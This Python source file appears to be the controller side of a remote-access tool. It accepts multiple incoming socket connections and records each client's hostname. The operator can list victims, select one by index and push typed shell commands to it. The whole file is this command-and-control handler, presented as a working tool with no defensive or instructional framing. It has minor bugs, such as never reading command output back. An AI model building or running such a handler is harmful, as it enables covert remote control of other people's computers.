import socket
from rich import print

host = socket.gethostbyname(socket.gethostname())
port = 1234
addr = (host, port)
chunk = 32
all_connections = []
all_addresses = []

server = socket.socket()
server.bind(addr)
server.listen()
print('[bold yellow][+++]Waiting for a new connection')

def accept_conn():
    try:
        while True:
            try:
                client,address = server.accept()
                # client_hostname = client.recv(1024).decode()
                client_hostname = receive_short_data(client)

                # adding the received client_hostname to the address tuple
                address += (client_hostname,)  

            except Exception as err:
                print(f'Connection error - > {err}')
            all_connections.append(client)
            all_addresses.append(address)
            print(f'Connected to {address[0]} on {address[1]}')
            # list_all_connections()
            shell()
            
    except KeyboardInterrupt as quit:
        print(f'[bold red]The tool has stopped')
        raise SystemExit

def list_all_connections():
    print("[yellow]ID\t IP ADDRESS\t PORT\t COMPUTER NAME\t")
    for i,conn in enumerate(all_connections):
        print(f'[bold blue]{i}      {all_addresses[i][0]}       {all_addresses[i][1]}           {all_addresses[i][2]}')

def select_target(cmd):
    try:
        target = int(cmd.split(' ')[-1])
    except Exception as index_err:
        print('[bold red]The index should be an integer')
        raise SystemExit
    
    try:
        conn = all_connections[target]
        print('[bold green]Connection has been established')
    except IndexError:
        print("[bold red]Invalid index")
        return None, None

    print(f'[bold yellow]Now connected to {all_addresses[target][2]}')
    return target,conn

def shell():
    while True:
        cmd = input("shell:/> ")

        if cmd == 'list':
            list_all_connections()
        elif 'select' in cmd:
            target,conn = select_target(cmd)

            if conn is not None:
                send_commands(conn)
        else:
            print('error')

def send_commands(conn):
    while True:
        cmd = input(f"[bold blue]shell:/> ")
        conn.send(cmd.encode("utf-8"))
        print('Command sent successfully')

def receive_large_data(conn):
    data = b''
    while len(data) < chunk:
        packet = conn.recv(chunk - len(data))

        if not packet:
            return None

        # getting the entire data
        data += packet
        # data = data.decode()
    # returning the entire data to be used after
    return data

def receive_short_data(conn):
    data = conn.recv(1024).decode()

    # returning data received to be used after
    return data
    
   
accept_conn()


    

